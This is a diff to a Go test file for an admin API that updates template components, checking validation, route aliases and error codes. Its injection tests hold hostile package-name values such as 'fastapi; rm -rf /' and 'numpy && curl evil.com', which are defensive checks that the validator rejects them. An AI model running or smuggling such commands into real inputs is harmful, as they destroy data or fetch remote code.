@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 	"net/http"
 	"net/http/httptest"
+	"strings"
 	"testing"
 
 	"solv-backend/internal/core/domain"
@@ -81,8 +82,16 @@ func (s *stubComponentGovRepo) UpdateTemplateComponent(ctx context.Context, tena
 		return nil, domain.ErrComponentNotFound
 	}
 	it.Name = dto.Name
+	if dto.Description != "" {
+		it.Description = dto.Description
+	}
+	if dto.SubCategory != "" {
+		it.SubCategory = dto.SubCategory
+	}
 	if synthesizedLayer != "" {
 		it.BuildLayerSnippet = synthesizedLayer
+	} else if strings.TrimSpace(dto.InstallMode) == string(domain.InstallModeNone) && strings.TrimSpace(dto.BuildLayerSnippet) == "" {
+		it.BuildLayerSnippet = ""
 	}
 	return it, nil
 }
@@ -148,5 +157,143 @@ func TestAdminAcademicHandler_ComponentsAndComposePreview(t *testing.T) {
 	}
 	if !resp.Data.NeedsLocalBuild {
 		t.Fatalf("expected NeedsLocalBuild=true when addon has pip build layer")
+	}
+}
+
+func TestAdminAcademicHandler_UpdateTemplateComponentAndAliases(t *testing.T) {
+	repo := newStubComponentGovRepo()
+	govSvc := services.NewAdminGovernanceService(nil, repo)
+	handler := NewAdminAcademicHandler(nil, nil, govSvc)
+
+	deps := &Handlers{
+		AdminAcademicHandler: handler,
+		TenantMiddleware:     func(next http.Handler) http.Handler { return next },
+		AuditMiddleware:      func(next http.Handler) http.Handler { return next },
+	}
+	mux := http.NewServeMux()
+	registerAdminRoutes(mux, deps)
+
+	// 1. Direct handler: Missing ID -> 400
+	reqNoID := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/", bytes.NewBufferString(`{"name":"NoID"}`))
+	recNoID := httptest.NewRecorder()
+	handler.UpdateTemplateComponent(recNoID, reqNoID)
+	if recNoID.Code != http.StatusBadRequest {
+		t.Fatalf("expected 400 on missing path id, got %d", recNoID.Code)
+	}
+
+	// 2. Direct handler: Component Not Found -> 404
+	reqNotFound := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/non-existent", bytes.NewBufferString(`{"name":"Ghost"}`))
+	reqNotFound.SetPathValue("id", "non-existent")
+	recNotFound := httptest.NewRecorder()
+	handler.UpdateTemplateComponent(recNotFound, reqNotFound)
+	if recNotFound.Code != http.StatusNotFound {
+		t.Fatalf("expected 404 on non-existent component, got %d", recNotFound.Code)
+	}
+
+	// 3. Direct handler: Invalid Package Name -> 422
+	badPkgBody := `{"name":"Python 3.12","install_mode":"pip","package_names":["pip; evil"]}`
+	reqBadPkg := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(badPkgBody))
+	reqBadPkg.SetPathValue("id", "rt-python")
+	recBadPkg := httptest.NewRecorder()
+	handler.UpdateTemplateComponent(recBadPkg, reqBadPkg)
+	if recBadPkg.Code != http.StatusUnprocessableEntity {
+		t.Fatalf("expected 422 on invalid package name in update, got %d", recBadPkg.Code)
+	}
+
+	// 4. Test all route aliases through the mux (PUT and PATCH on template-components, tech-components, components)
+	routesToTest := []struct {
+		method string
+		path   string
+	}{
+		{http.MethodPut, "/api/v1/admin/template-components/rt-python"},
+		{http.MethodPatch, "/api/v1/admin/template-components/rt-python"},
+		{http.MethodPut, "/api/v1/admin/tech-components/rt-python"},
+		{http.MethodPatch, "/api/v1/admin/tech-components/rt-python"},
+		{http.MethodPut, "/api/v1/admin/components/rt-python"},
+		{http.MethodPatch, "/api/v1/admin/components/rt-python"},
+	}
+
+	for _, rt := range routesToTest {
+		body := `{"name":"Python 3.12 Updated","sub_category":"backend","install_mode":"none"}`
+		req := httptest.NewRequest(rt.method, rt.path, bytes.NewBufferString(body))
+		rec := httptest.NewRecorder()
+		mux.ServeHTTP(rec, req)
+		if rec.Code != http.StatusOK {
+			t.Fatalf("expected 200 on %s %s, got %d: %s", rt.method, rt.path, rec.Code, rec.Body.String())
+		}
+		var resp struct {
+			Data domain.TemplateComponent `json:"data"`
+		}
+		if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
+			t.Fatalf("failed to decode response for %s %s: %v", rt.method, rt.path, err)
+		}
+		if resp.Data.Name != "Python 3.12 Updated" || resp.Data.SubCategory != "backend" {
+			t.Fatalf("expected updated fields for %s %s, got: %+v", rt.method, rt.path, resp.Data)
+		}
+	}
+}
+
+func TestAdminAcademicHandler_UpdateTemplateComponent_EdgeCases(t *testing.T) {
+	repo := newStubComponentGovRepo()
+	govSvc := services.NewAdminGovernanceService(nil, repo)
+	handler := NewAdminAcademicHandler(nil, nil, govSvc)
+
+	// 1. Malformed JSON returns 400 Bad Request
+	reqMalformed := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(`{"name": `))
+	reqMalformed.SetPathValue("id", "rt-python")
+	recMalformed := httptest.NewRecorder()
+	handler.UpdateTemplateComponent(recMalformed, reqMalformed)
+	if recMalformed.Code != http.StatusBadRequest {
+		t.Errorf("expected 400 on malformed JSON, got %d", recMalformed.Code)
+	}
+
+	// 2. Subcategory switch from backend to web
+	reqSubCat := httptest.NewRequest(http.MethodPatch, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(`{"name":"Python 3.12","sub_category":"web"}`))
+	reqSubCat.SetPathValue("id", "rt-python")
+	recSubCat := httptest.NewRecorder()
+	handler.UpdateTemplateComponent(recSubCat, reqSubCat)
+	if recSubCat.Code != http.StatusOK {
+		t.Errorf("expected 200 on subcategory update, got %d: %s", recSubCat.Code, recSubCat.Body.String())
+	}
+	var respSubCat struct {
+		Data domain.TemplateComponent `json:"data"`
+	}
+	_ = json.Unmarshal(recSubCat.Body.Bytes(), &respSubCat)
+	if respSubCat.Data.SubCategory != "web" {
+		t.Errorf("expected sub_category='web', got %q", respSubCat.Data.SubCategory)
+	}
+
+	// 3. Command injection in package names returns 422
+	injectionCases := []string{
+		`{"name":"Python","install_mode":"pip","package_names":["fastapi; rm -rf /"]}`,
+		`{"name":"Python","install_mode":"pip","package_names":["numpy && curl evil.com"]}`,
+		`{"name":"Node","install_mode":"npm","package_names":["@angular/cli | sh"]}`,
+	}
+	for idx, badPayload := range injectionCases {
+		reqInj := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(badPayload))
+		reqInj.SetPathValue("id", "rt-python")
+		recInj := httptest.NewRecorder()
+		handler.UpdateTemplateComponent(recInj, reqInj)
+		if recInj.Code != http.StatusUnprocessableEntity {
+			t.Errorf("case %d: expected 422 on malicious package name, got %d", idx, recInj.Code)
+		}
+	}
+
+	// 4. Short name (< 2 characters) returns 422
+	reqShort := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(`{"name":"A"}`))
+	reqShort.SetPathValue("id", "rt-python")
+	recShort := httptest.NewRecorder()
+	handler.UpdateTemplateComponent(recShort, reqShort)
+	if recShort.Code != http.StatusUnprocessableEntity {
+		t.Errorf("expected 422 on name with < 2 characters, got %d", recShort.Code)
+	}
+
+	// 5. Image ending with :latest returns 422
+	reqLatest := httptest.NewRequest(http.MethodPut, "/api/v1/admin/template-components/rt-python", bytes.NewBufferString(`{"name":"Python 3.12","base_image":"python:latest"}`))
+	reqLatest.SetPathValue("id", "rt-python")
+	recLatest := httptest.NewRecorder()
+	handler.UpdateTemplateComponent(recLatest, reqLatest)
+	if recLatest.Code != http.StatusUnprocessableEntity {
+		t.Errorf("expected 422 on image with :latest tag, got %d", recLatest.Code)
 	}
 }
